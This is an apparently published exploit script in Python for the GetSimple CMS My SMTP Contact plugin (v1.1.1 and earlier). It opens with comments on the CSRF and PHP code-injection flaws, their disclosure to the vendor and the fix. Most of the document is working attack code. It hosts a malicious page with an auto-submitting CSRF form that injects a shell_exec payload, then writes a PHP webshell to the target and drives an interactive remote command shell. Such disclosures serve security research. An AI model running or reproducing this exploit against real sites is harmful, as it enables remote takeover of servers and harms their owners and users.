# Exploit Title: GetSimple CMS My SMTP Contact Plugin <= v1.1.1 - CSRF to RCE
# Exploit Author: Bobby Cooke (boku)
# Date: April 15th, 2021
# Vendor Homepage: http://get-simple.info 
# Software Link: http://get-simple.info/extend/download.php?file=files/18274/1221/my-smtp-contact_1.1.1.zip&id=1221
# Vendor: NetExplorer
# Version: <= v1.1.1
# Tested against Server Host: Windows 10 Pro + XAMPP
# Tested against Client Browsers: Firefox
# About My SMTP Contact Plugin:
#   An authenticated admin of the GetSimple CMS application, who has implemented the My SMTP Contact plugin, can navigate to the plugins configuration page within the admin console, and configure the settings for the SMTP form. The purpose of this plugin is to enable webpages of the CMS to host a contact form, where users of the application will be able to submit requests to the owner. These requests will be sent to the owner via SMTP email.
# CSRF Vulnerability Information:
#   The GetSimple CMS application does not utilize the SameSite flag for the session cookie, and instead uses a CSRF token "nonce" to protect against cross-site attacks. Version of the  My SMTP Contact plugin v1.1.1 and before do not implement the CSRF token. The vendor was contacted March 28th 2021, and released v1.1.2 in response, which remediates this vulnerability by implementing the CSRF "nonce" token.
# PHP Code Injection Vulnerability Information:
#   When the administrator configures the SMTP settings, the backend PHP code of the plugin injects the admins user input into PHP code files. These user supplied values are injected into PHP strings which use double quotes. Some features of PHP double quote strings are that variables can be expanded within the strings, and variables enclosed in {} braces will attempt to evaluate complex expressions; resulting in code execution. The method in this proof of concept also overcomes the developers attempt to sanitize the user input by using htmlspecialchars() which removes "'<> and other dangerous characters. The developer received full disclosure of this vulnerability. A simple way to remediate this issue, would be to inject the user supplied input into single quote strings, versus the double quote strings. As single quote strings do not permit variable expansion and complex expression evaluation.
# Exploit Description:
#   The My SMTP Contact v1.1.1 plugin for GetSimple CMS suffers from a CSRF & PHP Code Injection vulnerabilities that when chained together, allow remote unauthenticated attackers to achieve Remote Code Execution on the hosting server, when an authenticated administrator visits a malicious third party website.
# CVSS v3.1 Vector: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
# CVSS Base Score: 9.6

import argparse,requests
from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import (Fore as F, Back as B, Style as S)
from threading import Thread
from time import sleep

FT,FR,FG,FY,FB,FM,FC,ST,SD,SB = F.RESET,F.RED,F.GREEN,F.YELLOW,F.BLUE,F.MAGENTA,F.CYAN,S.RESET_ALL,S.DIM,S.BRIGHT
def bullet(char,color):
    C=FB if color == 'B' else FR if color == 'R' else FG
    return SB+C+'['+ST+SB+char+SB+C+']'+ST+' '
info,err,ok = bullet('-','B'),bullet('-','R'),bullet('!','G')

class theTHREADER(object):
    def __init__(self, interval=1):
        self.interval = interval
        thread = Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()
    def run(self):
        run()

def webshell(target):
    try:
        websh = "{}/webshell.php".format(target)
        term = "{}{}BOKU{} > {}".format(SB,FR,FB,ST)
        author = '{}{}]{}+++{}[{}========>{} Pwnage Provider : Bobby Cooke {}<========{}]{}+++{}[{}'.format(SB,FY,FR,FY,FT,FR,FT,FY,FR,FY,ST)
        print(author)
        while True:
            specialmove = input(term)
            command = {'FierceGodKick': specialmove}
            r = requests.post(websh, data=command, verify=False)
            status = r.status_code
            if status != 200:
                r.raise_for_status()
            response = r.text
            print(response)
    except:
        pass

def generateCsrfPayload():
    payload  = '<body><form action="'+target+'/admin/load.php?id=my-smtp-contact" method="POST">'
    payload += '<input type="hidden" name="act" value="addsettings">'
    payload += '<input type="hidden" name="m_smtp_c_language" value="en.php">'
    payload += '<input type="hidden" name="m_smtp_c_email_to" value="boku@0xboku">'
    payload += '<input type="hidden" name="m_smtp_c_smtp_or_standard" value="standard">'
    payload += '<input type="hidden" name="m_smtp_c_digital_captcha" value="on">'
    payload += '<input type="hidden" name="m_smtp_c_digitSalt" value="TLGfUrl3TyiaxOKwrg5d0exfBYKbHDwR">'
    payload += '<input type="hidden" name="m_smtp_c_agree_checkbox" value="on">'
    payload += '<input type="hidden" name="m_smtp_c_client_server" value="client_server">'
    payload += '<input type="hidden" name="m_smtp_c_window_msg" value="on">'
    payload += '<input type="hidden" name="m_smtp_c_default_css" value="on">'
    payload += '<input type="hidden" name="m_smtp_c_sender_name" value="boku">'
    payload += '<input type="hidden" name="m_smtp_c_subject" value="RCE">'
    payload += '<input type="hidden" name="m_smtp_c_email_from" value="boku@0xboku">'
    payload += '<input type="hidden" name="m_smtp_c_email_from_password" value="password123">'
    payload += '<input type="hidden" name="m_smtp_c_email_from_ssl" value="ssl://smtp.0xboku">'
    payload += '<input type="hidden" name="m_smtp_c_email_from_port" value="777">'
    payload += '<input type="hidden" name="m_smtp_c_standard_email_from" value="boku@0xboku">'
    payload += '<input type="hidden" name="my_smtp_c_selected_dir" value="62605e65e25ab30">'
    payload += '<input type="hidden" name="my_smtp_c_selected_name" value="asd">'
    payload += '<input type="hidden" name="m_smtp_c_alternative_fields" value="off">'
    payload += '<input type="hidden" name="m_smtp_c_qty_fields" value="1">'
    payload += '<input type="hidden" name="m_smtp_c_limit_file_size" value="1">'
    payload += '<input type="hidden" name="m_smtp_c_valid_file_format" value="jpeg">'
    payload += '<input type="hidden" name="m_smtp_c_arr_fields_Name[]" value="User name">'
    payload += '<input type="hidden" name="m_smtp_c_arr_fields_Name_ok[]" value="ok">'
    payload += '<input type="hidden" name="m_smtp_c_arr_tags_Name[]" value="0">'
    payload += '<input type="hidden" name="m_smtp_c_arr_fields_Required[]" value="required">'
    payload += '<input type="hidden" name="m_smtp_c_arr_fields_Type[]" value="text">'
    payload += '<input type="hidden" name="m_smtp_c_arr_fields_Maxlength[]" value="50">'
    payload += '<input type="hidden" name="m_smtp_c_arr_fields_Code[]" value="{$m_smtp_c_qty_fields[shell_exec($_REQUEST[solarflare])]}">'
    payload += '<input type="submit" value="Submit request">'
    payload += '</form><body>'
    return payload

class S(BaseHTTPRequestHandler):
    def do_GET(self):
        victim = self.client_address
        victim = "{}:{}".format(victim[0],victim[1])
        print("{} connected to Malicious CSRF Site!".format(victim))
        self.wfile.write("{}".format(generateCsrfPayload()).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    banner  = '{}{}GetSimpleCMS My SMTP Contact Plugin v1.1.1 - CSRF to RCE{}'.format(SB,FR,ST)
    print(banner)
    print('Listening for Victims to connect..')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print('Stopping httpd...')

# Attempts to exploit the Blind RCE of the PHP Code Injection from the CSRF attack to upload a PHP webshell
def tryUploadWebshell(target,contact):
    try:
        blind = target+contact
        # The ^ symbols are required to escape the <> symbols to create the non-blind webshell (^ is an escape for window cmd prompt)
        webshUpload  = {'solarflare': "echo ^<?php echo shell_exec($_REQUEST['FierceGodKick']) ?^>>webshell.php"}
        requests.post(url=blind, data=webshUpload, verify=False)
    except:
        pass

def checkWebshell(target):
    try:
        websh = "{}/webshell.php".format(target)
        capsule = {'FierceGodKick':'pwnt?'}
        resp = requests.post(url=websh, data=capsule, verify=False)
        return resp.status_code
    except:
        pass

def argsetup():
    about  = SB+FT+'The My SMTP Contact v1.1.1 plugin for GetSimple CMS suffers from a CSRF & PHP Code Injection vulnerabilities that when chained together, allow remote unauthenticated attackers to achieve Remote Code Execution on the hosting server, when an authenticated administrator visits a malicious third party website. '
    about += FR+'CVSS Base Score: 9.6 | '
    about += 'CVSS v3.1 Vector: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H'+ST
    parser = argparse.ArgumentParser(description=about)
    parser.add_argument('TargetSite',type=str,help='The routable domain name of the target site')
    parser.add_argument('SMTPContactPage',type=str,help='The path to the public page which implements the SMTP Contact form - Used for blind RCE')
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args      = argsetup()
    target    = args.TargetSite
    contact   = args.SMTPContactPage
    threadshed = theTHREADER()
    pwnt = checkWebshell(target)
    if pwnt != 200:
        while pwnt != 200:
            sleep(3)
            tryUploadWebshell(target,contact)
            sleep(2)
            pwnt = checkWebshell(target)
    print("{} Triggered the Blind RCE and caught a wild webshell!".format(ok))
    webshell(target)
